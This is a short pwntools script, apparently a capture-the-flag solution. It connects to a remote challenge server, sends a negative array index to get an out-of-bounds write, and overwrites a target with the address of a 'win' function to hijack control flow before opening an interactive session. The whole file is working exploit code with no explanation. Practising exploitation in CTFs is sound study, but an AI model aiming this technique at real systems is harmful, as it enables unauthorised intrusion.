from pwn import *

elf = ELF("./chall")

context.arch = 'amd64'

p = remote("34.170.146.252", 63475)

p.sendlineafter(b"index: ", b"-12")

win_addr = elf.symbols["win"]
payload = str(win_addr).encode() + p64(0) + b"\x00"*0x100

p.sendlineafter(b"value: ", payload)

p.interactive()
